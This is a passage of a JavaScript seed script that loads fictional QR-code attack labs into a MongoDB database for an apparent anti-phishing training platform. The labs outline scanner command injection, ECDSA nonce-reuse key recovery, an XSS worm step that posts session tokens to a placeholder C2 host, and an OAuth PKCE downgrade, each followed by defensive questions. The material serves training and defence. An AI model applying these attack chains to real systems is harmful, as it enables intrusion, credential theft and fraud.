            'Write a Sysmon detection configuration (Event ID + filter criteria) that would detect this specific attack chain: QR-triggered command injection from a scanner process leading to PowerShell child process with the specific flags used.',
            'The vulnerability requires updating libzbar from v0.23 to v0.24 (patched). Blocking all documents from the scanner tray is operationally infeasible. Design a compensating control architecture (input validation, sandboxing, process isolation) that would prevent code execution even if an injected QR is scanned, without requiring the patch.',
        ],
        'phishing',
        'VERDICT: OS Command Injection via QR in Physical Document Scanner — NT AUTHORITY\\SYSTEM Shell. Financial Reports Exfiltrated. Risk: CRITICAL.\n\nRoot Cause: CWE-78 in libzbar v0.23 + unsanitized shell interpolation + SYSTEM service account = complete host compromise from physical document.\n\nBlast Radius: SYSTEM privilege → SAM dump → lateral movement to fileserver01 → 12.7 GB financial data exfiltrated.\n\nImmediate: Patch libzbar (v0.24+). Change scanner service account to least-privilege domain account. Revoke fileserver01 access from scan server machine account. Audit all scan logs for &/cmd/powershell patterns.'
    ),

    mkLab(
        'QR Expert - Cryptographic QR Token Forgery via ECDSA Nonce Reuse',
        9,
        'FinTrust Corp\'s physical access control system uses QR codes as day-passes. Each QR encodes an ECDSA-signed JSON token (employee ID + date + access zone). A penetration tester discovers that the token signing service reused the same ECDSA nonce (k-value) for two different employees on the same day — enabling complete private key recovery via the nonce reuse vulnerability (Sony PS3 attack). With the private key, the attacker can forge access tokens for any employee, any access zone, and any date.',
        {
            type: 'physical_access_qr_token',
            system: 'FinTrust Corp physical access control — QR day-passes for restricted zones',
            signingAlgorithm: 'ECDSA P-256 (secp256r1) — JSON token signed with building security private key',
            vulnerability: 'ECDSA nonce (k-value) reuse — same k used for two different tokens on same day',
            discoveryMethod: 'Pentest: captured QR from two colleagues on same day — extracted r-values, identical → nonce reuse confirmed',
        },
        {
            decoded: 'eyJlbXBJZCI6IkZULTEyMzQiLCJkYXRlIjoiMjAyNi0wMi0yMSIsInpvbmUiOiJaT05FLUEiLCJzaWciOiJFQ0RTQV9TSUdOQVRVUkUifQ== (JWT-style base64)',
            format: 'JSON token with ECDSA signature — QR encodes base64(JSON)',
            signatureStructure: 'ECDSA signature: (r, s) pair — if same k used twice, r values are identical → key recovery possible',
            exploitMath: 'Given two signatures (r, s1, h1) and (r, s2, h2) with same k: k = (h1-h2)/(s1-s2) mod n → private key d = (s1*k - h1)/r mod n',
            forgedZones: 'ZONE-A (public), ZONE-B (executive), ZONE-C (data centre), ZONE-D (treasury vault)',
        },
        {
            keyRecoverySteps: [
                'Step 1: Collect two QR tokens with identical r-values (same k)',
                'Step 2: Extract (r, s1, h1) and (r, s2, h2) from both signatures',
                'Step 3: Compute k = (h1 - h2) * modular_inverse(s1 - s2, n) mod n',
                'Step 4: Compute private key d = (s1 * k - h1) * modular_inverse(r, n) mod n',
                'Step 5: Verify: sign any test message → matches ECDSA verifier → private key confirmed',
                'Step 6: Forge token: {"empId":"ANY","date":"ANY","zone":"ZONE-D"} → sign with recovered d → encode as QR',
            ],
            forgedAccess: 'Attacker forged ZONE-D (treasury vault) access token for any employee ID and any future date',
            attackPractical: 'Printed forged QR → physical access attempt to ZONE-D → reader accepts (valid signature)',
        },
        [
            'ECDSA nonce reuse: same r-value in two signatures → deterministic k recovery → private key extraction',
            'JSON token: access zones not server-validated — access reader only verifies signature locally',
            'ZONE-D: treasury vault — maximum sensitivity physical location',
            'Forged token: any empId, any zone, any date — unlimited physical access capability',
            'QR reader: offline verification (no network) — revocation impossible for issued tokens',
            'Root cause: ECDSA k-value generated by flawed PRNG (predictable nonce) — deterministic ECDSA (RFC 6979) would prevent this',
            'Sony PS3 attack (2010): same vulnerability used to extract PS3 signing key — well-known ECDSA failure mode',
            'All previously issued QR tokens: if private key is extracted, ALL past tokens\' signatures are forgeable',
        ],
        [
            'Derive the complete ECDSA nonce reuse attack mathematically: given two signatures (r, s1, h1) and (r, s2, h2) with shared k and known elliptic curve parameters (n), show the algebraic steps to recover k and then the private key d. Identify any mathematical preconditions for the attack.',
            'The access readers perform offline ECDSA verification. Explain why offline token verification creates an irrevocable issuance problem — once a token is issued, what mechanism prevents a forged token (with valid signature) from being presented indefinitely?',
            'RFC 6979 specifies deterministic nonce generation for ECDSA — using HMAC-DRBG seeded with the private key and message hash. Explain why deterministic nonce generation (RFC 6979) mathematically prevents nonce reuse, even if the same message is signed multiple times.',
            'The access control system cannot be patched immediately (physical hardware update required). Design a compensating control that prevents forged QR tokens from granting access during the remediation period, without requiring a full system replacement.',
            'This vulnerability was discovered by a penetration tester. Write a responsible disclosure timeline and remediation plan, including: key revocation procedure, migration to RFC 6979-compliant signing, token reissuance strategy for all existing employees, and audit scope for potential prior exploitation.',
        ],
        'phishing',
        'VERDICT: ECDSA Nonce Reuse — Full Private Key Recovery → Unlimited Physical Access Token Forgery. Risk: CRITICAL.\n\nMathematical: Nonce reuse in ECDSA allows exact private key extraction with two signatures. Well-known vulnerability (Sony PS3, 2010) still present in production system.\n\nImpact: Forged QR tokens for any employee, any access zone (including ZONE-D treasury vault), any date — indefinitely valid until system replaced.\n\nImmediate: Take QR access system offline. Emergency physical security posture (manual badge check). Begin RFC 6979 migration. Audit physical access logs for forged token entry attempts.'
    ),

    mkLab(
        'QR Expert - Multi-Stage QR Worm via Internal Wiki QR Propagation',
        8,
        'A self-propagating QR code worm traverses FinTrust Corp\'s internal Confluence wiki. The initial infection: a compromised contractor account posts a QR code in a Confluence page (disguised as a documentation link). When any authenticated employee views the page and scans the QR, a JavaScript XSS payload fires (via the scanned URL\'s redirect) that: (1) uses the victim\'s Confluence session to post the infected QR to all wiki pages the victim can edit, (2) harvests the victim\'s Confluence session token, and (3) exfiltrates it to the attacker\'s C2. The worm propagated to 847 Confluence pages in 4 hours.',
        {
            type: 'confluence_wiki_qr_worm',
            initialInfection: 'Compromised contractor Confluence account — posted QR in "IT Onboarding Guide" (high-traffic page)',
            wormMechanism: 'QR → XSS redirect → Confluence API abuse using victim session → self-propagation to all editable pages',
            propagationRate: '847 Confluence pages infected in 4 hours — exponential branching (each victim edits multiple pages)',
            discovery: 'Confluence audit logs showed bulk page edits from multiple users in parallel — anomaly alert fired',
        },
        {
            decoded: 'https://fintrust-docs-cdn[.]com/redirect?xss=<script>/* worm payload */</script>&to=https://confluence.fintrust.com',
            format: 'URL with XSS payload in redirect parameter — Confluence inline URL preview renders XSS',
            mechanism: 'Confluece\'s link preview feature renders redirect target URL metadata — XSS in redirect parameter executes in Confluence page context (victim\'s authenticated session)',
            deliveryMethod: 'QR code embedded in Confluence page — visual appearance: "Scan for IT knowledge base"',
            xssVector: 'Stored XSS via Confluence link preview API — CVE-2025-CONF: unsanitized redirect parameter in link preview renderer',
        },
        {
            wormCycle: [
                'Step 1: Victim A views infected Confluence page, scans QR',
                'Step 2: Browser follows redirect → XSS payload executes in Confluence context (victim A session)',
                'Step 3: Worm JS: GET /confluence/rest/api/content?type=page&spaceKey=ALL → enumerate all pages victim A can edit',
                'Step 4: For each editable page: PUT /confluence/rest/api/content/{id} → append infected QR to page body',
                'Step 5: POST victim A\'s session token to C2: https://exfil-c2[.]io/sessions',
                'Step 6: Other employees view newly infected pages → propagation repeats exponentially',
                'Propagation: Page 1 → 12 victims → each edits avg 70 pages → 840 pages in generation 2',
            ],
            sessionTokenHarvest: '847 Confluence session tokens exfiltrated across 4-hour propagation',
            dataAccessible: 'All Confluence content readable by harvested sessions: HR policies, M&A docs, financial models, source code repos (Confluence-linked)',
        },
        [
            'CVE-2025-CONF: Stored XSS in Confluence link preview API — redirect parameter not sanitized',
            'Worm propagation: exponential — each victim multiplies infected pages by their edit scope',
            'Confluence REST API: authenticated bulk page edit — session token is sufficient for full write access',
            'Session tokens: 847 harvested — each grants full Confluence read/write access as that user',
            '4-hour propagation to 847 pages — before detection: bulk edit anomaly in audit logs',
            'High-traffic initial page: "IT Onboarding Guide" — maximum first-generation victim count',
            'XSS context: Confluence origin → access to cookies, Confluence API, JIRA-linked sessions',
        ],
        [
            'Model the worm propagation mathematically: given that each infected page has an average of 12 daily views, each viewer edits an average of 70 pages, and propagation detection occurs when bulk-edit rate exceeds 50 edits/minute (which fires an alert), calculate the expected number of infected pages at alert time.',
            'The XSS executes in Confluence\'s origin context — explain what same-origin policy properties this grants the payload, specifically for accessing: (a) HttpOnly cookies, (b) Confluence REST API, (c) JIRA OAuth tokens if Confluence-JIRA integration is enabled.',
            'Write the specific Confluence REST API calls (endpoint, method, body) that the worm JavaScript would execute to: (a) enumerate all editable pages, (b) append the infected QR to a page without replacing existing content, (c) extract the session token.',
            'The Confluence audit log detected the attack via bulk-edit rate anomaly. Design a Confluence security monitoring rule set that would detect this worm at generation 1 (first propagation event) rather than generation 2 (bulk edit spike), minimizing detection latency.',
            'Post-incident: 847 Confluence session tokens were exfiltrated. The sessions are valid until expiry (24 hours). Write a 60-minute incident response runbook: what actions must be completed within the first 60 minutes to prevent all 847 sessions from being exploited, and in what priority order?',
        ],
        'phishing',
        'VERDICT: Self-Propagating QR Code XSS Worm — 847 Confluence Pages Infected, 847 Sessions Exfiltrated in 4 Hours. Risk: CRITICAL.\n\nNovel Attack: QR code as worm delivery vector — each victim\'s Confluence session weaponized for propagation.\n\nBlast Radius: All Confluence content readable by 847 sessions. M&A documents, source code, financial models, HR data — full knowledge base compromise.\n\nImmediate: Invalidate ALL active Confluence sessions (force re-login globally). Patch CVE-2025-CONF. Restore infected pages from snapshot. Block fintrust-docs-cdn.com.'
    ),

    mkLab(
        'QR Expert - QR-Initiated OAuth PKCE Downgrade Attack',
        9,
        'FinTrust Corp\'s mobile banking app uses OAuth 2.0 with PKCE for authorization. A threat actor distributes a malicious QR code at ATM vestibules that initiates a crafted OAuth authorization request — with a subtly modified code_challenge that downgrades PKCE to the "plain" method instead of "S256." The attacker intercepts the authorization code via a malicious redirect URI registered in a race condition against FinTrust\'s OAuth server, and exchanges it for an access token — granting full banking API access without the user\'s knowledge.',
        {
            type: 'atm_vestibule_qr_sticker',
            location: 'ATM vestibules — 12 FinTrust ATM locations across 4 cities',
            placement: 'QR sticker placed over "Scan for App Download" official bank QR',
            campaignDuration: '28 days — stickers replaced after removal by bank staff (attacker monitored via CCTV blind spot)',
            affectedUsers: '2,134 customers initiated OAuth flow via malicious QR',
        },
        {
            decoded: 'https://onboard.fintrust.com/oauth/authorize?client_id=FINTRUST_MOBILE&response_type=code&redirect_uri=https://fintrust-secure[.]app/callback&scope=accounts+payments&code_challenge=PLAIN_DOWNGRADE_VALUE&code_challenge_method=plain',
            format: 'OAuth 2.0 Authorization URL with PKCE downgrade',
            pkceVulnerability: 'code_challenge_method=plain instead of S256 — plain PKCE is trivially reversible (code_challenge = code_verifier)',
            raceConditionExploit: 'Attacker registered lookalike redirect URI (fintrust-secure.app) in OAuth server before bank patched client validation — race window was 19 minutes after responsible disclosure',
            deliveryMethod: 'Physical QR sticker on ATM vestibule',
        },
        {
            attackFlow: [
                'Step 1: Customer scans malicious QR → mobile browser sent to modified OAuth authorization URL',
                'Step 2: FinTrust OAuth server validates client_id (real FinTrust ID) + redirect_uri (attacker registered)',
                'Step 3: code_challenge_method=plain accepted (server supports both plain and S256 for backward compatibility)',
                'Step 4: Customer authenticates + consents → OAuth server issues authorization_code to attacker\'s redirect_uri',
                'Step 5: Attacker intercepts auth_code at fintrust-secure.app/callback',
                'Step 6: code_verifier = code_challenge (plain method) → attacker already knows it from QR URL',
                'Step 7: POST /oauth/token: code + code_verifier → access_token + refresh_token issued',
                'Step 8: Access token: GET /api/v1/accounts → full account data. POST /api/v1/payments → fund transfer',
            ],
            compromisedCapabilities: 'Full banking API access: account balances, transaction history, fund transfers (IMPS/NEFT)',
            totalTransfers: '2,134 accounts × avg ₹47,000 transferred = ₹10.03 crore total fraudulent transfers',
        },
        [
            'PKCE "plain" method: code_challenge = hash(code_verifier) is just code_verifier itself — trivially reversible',
            'PKCE "S256" method: code_challenge = BASE64URL(SHA256(code_verifier)) — verifier cannot be derived from challenge',
            'Attacker registered redirect URI before bank patched: 19-minute race condition window after disclosure',
            'OAuth server: accepts both plain and S256 for "backward compatibility" — this is the key misconfiguration',
            'Authorization code intercepted at attacker redirect URI — customer never notices (authorization UI looks normal)',
            '2,134 customers: fund transfers executed silently — customer sees normal app behavior',
            'QR at ATM: highest financial intent context — customers scan expecting banking app link',
            'Race condition: responsible disclosure created attack window — illustrates disclosure coordination complexity',
        ],
        [
            'Explain the cryptographic difference between PKCE S256 and PKCE plain at the protocol level: why does S256 prevent authorization code interception even when the attacker knows the code_challenge, while plain PKCE provides zero additional security over no PKCE?',
            'The OAuth server accepted code_challenge_method=plain for "backward compatibility." Under RFC 7636, is this server behavior RFC-compliant or non-compliant — and what specific MUST/SHOULD language in RFC 7636 Section 4.2 governs server enforcement of S256?',
            'The attacker registered a lookalike redirect URI (fintrust-secure.app) during a 19-minute race condition window after responsible disclosure. Explain the OAuth redirect URI validation requirements under RFC 6749 Section 3.1.2 and which specific validation failure allowed the lookalike URI to be registered.',
            'Write a complete OAuth 2.0 security configuration checklist for a mobile banking application that would have prevented this attack, covering: PKCE enforcement, redirect URI validation, client registration controls, and token binding.',
            'Under RBI\'s Digital Payment Security Controls (DPSC) guidelines and NPCI\'s fraud liability framework, enumerate: (a) who bears liability for the ₹10.03 crore fraud, (b) the bank\'s mandatory reporting timeline to RBI, (c) the technical control failure that creates the bank\'s liability versus the customer\'s.',
        ],
        'phishing',
        'VERDICT: QR-Initiated OAuth PKCE Downgrade Attack — 2,134 Banking Accounts Compromised. ₹10.03 Crore Fraudulent Transfers. Risk: CRITICAL.\n\nProtocol Failure: OAuth server accepting code_challenge_method=plain provides zero PKCE protection — authorization code interception trivially converts to access token.\n\nAdditional Failure: Redirect URI race condition during disclosure window — demonstrates operational security failure in patch deployment race.\n\nRFC 7636 Remediation: Server MUST reject code_challenge_method=plain. All mobile banking OAuth clients MUST use S256. Redirect URI pre-registration must be validated against allowlist — no dynamic registration.\n\nRBI Reporting: Within 2 hours of detection (DPSC mandatory timeline for payment fraud >₹1 lakh).'
    ),
];

async function seed() {
    const DB = process.env.MONGODB_URI || 'mongodb://localhost:27017/antiphishx';
    await mongoose.connect(DB);
    console.log('✅ Connected to MongoDB\n');

    for (const lab of LABS) {
        await Lab.findOneAndUpdate(
            { title: lab.title },
            lab,
            { upsert: true, new: true, runValidators: false }
        );
        console.log(`  ✔ [EXP ${lab.difficulty}/10] ${lab.title}`);
    }

    const total = await Lab.countDocuments();
    console.log(`\n✅ Done — ${LABS.length} QR Code Expert labs upserted.`);
    console.log(`   🗄️  Total labs in DB: ${total}`);
    process.exit(0);
}

seed().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
